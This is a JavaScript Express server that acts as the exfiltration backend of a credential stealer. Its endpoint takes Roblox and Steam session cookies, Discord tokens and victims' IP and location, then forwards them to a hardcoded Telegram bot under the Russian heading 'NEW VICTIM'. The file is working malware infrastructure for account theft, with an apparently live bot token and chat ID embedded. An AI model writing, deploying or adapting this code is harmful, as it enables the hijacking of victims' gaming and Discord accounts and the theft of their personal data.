const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const TOKEN = "8679009953:AAE6I66uPMllDNCAdIL2vTUD7fs_Hvoo7uc";
const CHAT_ID = "6145369088";
const API = "https://api.telegram.org/bot" + TOKEN;

app.post('/send', async (req, res) => {
    try {
        const { robloxCookie, steamCookie, discordToken, ip, country, city } = req.body;

        let msg = "🔴 <b>НОВАЯ ЖЕРТВА</b>\n\n";
        if (ip) {
            msg += "🌐 <b>IP:</b> <code>" + ip + "</code>\n";
            msg += "📍 <b>Страна:</b> <code>" + (country || "Н/Д") + "</code>\n";
            msg += "🏙 <b>Город:</b> <code>" + (city || "Н/Д") + "</code>\n\n";
        }

        await axios.post(API + "/sendMessage", {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: "HTML"
        });

        if (robloxCookie) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('document', robloxCookie, 'roblox_cookie.txt');
            await axios.post(API + "/sendDocument", fd, { headers: { 'Content-Type': 'multipart/form-data' } });
        }

        if (steamCookie) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('document', steamCookie, 'steam_cookie.txt');
            await axios.post(API + "/sendDocument", fd, { headers: { 'Content-Type': 'multipart/form-data' } });
        }

        if (discordToken) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('document', discordToken, 'discord_token.txt');
            await axios.post(API + "/sendDocument", fd, { headers: { 'Content-Type': 'multipart/form-data' } });
        }

        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.listen(process.env.PORT || 3000);
